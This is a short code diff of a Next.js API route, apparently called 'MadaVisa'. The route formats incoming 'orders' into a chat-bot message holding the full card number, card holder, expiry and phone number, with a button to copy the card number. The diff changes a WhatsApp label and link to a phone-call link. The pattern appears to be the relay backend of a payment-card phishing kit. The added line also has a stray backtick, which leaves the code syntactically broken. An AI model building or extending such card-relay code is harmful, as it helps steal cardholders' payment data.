@@ -28,7 +28,7 @@ export async function POST(req: NextRequest) {
     ``,
     `🏦 MadaVisa - New Order`,
     `🙍 Order For: ${ltr}${customer ?? "-"}`,
-    `📲 WhatsApp: ${ltr}${whatsapp ?? "-"}`,
+    `📱 رقم الجوال: ${ltr}${whatsapp ?? "-"}`,`
     `🪪 Card Number: ${ltr}${cardNumber}`,
     `✍️ Card Holder: ${ltr}${cardHolder}`,
     `📆 Valid To: ${ltr}${expiry}`,
@@ -40,7 +40,7 @@ export async function POST(req: NextRequest) {
     inline_keyboard: [
       [
         { text: "📋 نسخ رقم البطاقة", copy_text: { text: cardNumber } },
-        ...(whatsappNum ? [{ text: "💬 فتح واتساب", url: `https://wa.me/${whatsappNum}` }] : []),
+        ...(whatsappNum ? [{ text: "📞 اتصال", url: `tel:${whatsappNum}` }] : []),
       ],
     ],
   };
